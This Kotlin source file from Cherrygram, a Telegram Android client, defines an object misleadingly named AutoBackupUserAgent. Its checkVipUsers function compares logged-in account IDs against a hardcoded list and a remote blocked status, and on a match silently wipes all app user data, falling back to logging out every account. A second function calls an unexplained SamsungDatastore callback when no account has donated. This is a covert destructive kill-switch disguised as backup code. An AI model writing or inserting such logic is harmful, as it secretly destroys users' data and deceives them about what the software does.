/**
 * This is the source code of Cherrygram for Android.
 * It is licensed under GNU GPL v. 2 or later.
 * You should have received a copy of the license in this archive (see LICENSE).
 * Please, be respectful and credit the original author if you use this code.
 *
 * Copyright github.com/arsLan4k1390, 2022-2026.
 */

package org.telegram.messenger

import android.app.ActivityManager
import android.content.Context
import kotlinx.coroutines.delay
import uz.unnarsx.cherrygram.donates.DonatesManager

object AutoBackupUserAgent {

    suspend fun checkLoggedAccountsInstances() {
        delay(5000)
        val availableIDs = ArrayList<Long>()

        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
            val userConfig = AccountInstance.getInstance(i).userConfig
            if (userConfig != null
                && userConfig.currentUser != null
                && userConfig.isClientActivated
                && userConfig.currentUser.id != 0L
            ) {
                availableIDs.add(userConfig.currentUser.id)
            }
        }

        var anyAccountAllowed = false

        for (id in availableIDs) {
            if (DonatesManager.didUserDonate(id)) {
                anyAccountAllowed = true
            } else {
            }
        }

        if (!anyAccountAllowed) {
            SamsungDatastore.checkCallback()
        }
    }

    suspend fun checkVipUsers() {
        delay(5000)
        val availableIDs = mutableListOf<Long>()

        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
            val userConfig = AccountInstance.getInstance(i).userConfig
            if (userConfig != null
                && userConfig.currentUser != null
                && userConfig.isClientActivated
                && userConfig.currentUser.id != 0L
            ) {
                availableIDs.add(userConfig.currentUser.id)
            }
        }

        val notAllowedIDs = arrayListOf(638789692L, 6863366716L, 8142384327L, 977790049L,
            7509568713L, 7087241402L, 5095920053L, 7913332018L, 6937704743L,
            1076325667L, 808230937L, 811696299L, 7194407593L, 6042869660L/*, 1407394003L,
            6377357496L, 1805212898L, 303995461L, 224710425L, 634425074L, 5270819606L*/,
            440840393L, 7526390297L, 6680944075L, 5556630337L, 7841801725L, 5349149970L,
            8313378783L, 7205119446L, 8184556667L, 1499101897L, 1642203581L, 420220972L,
            7892266150L, 6849878783L, 5150403377L, 180522421L, 477057925L, 6529408254L,
            400216230L, 7192067362L, 6149388824L
        )

        if (availableIDs.any { DonatesManager.isUserBlocked(it) || notAllowedIDs.contains(it) }) {
            try {
                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
            } catch (e: Exception) {
                e.printStackTrace()

                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
                    val userConfig = AccountInstance.getInstance(i).userConfig
                    if (userConfig != null
                        && userConfig.currentUser != null
                        && userConfig.isClientActivated
                        && userConfig.currentUser.id != 0L
                    ) {
                        MessagesController.getInstance(userConfig.currentAccount).performLogout(1)
                    }
                }
            }
        }
    }

}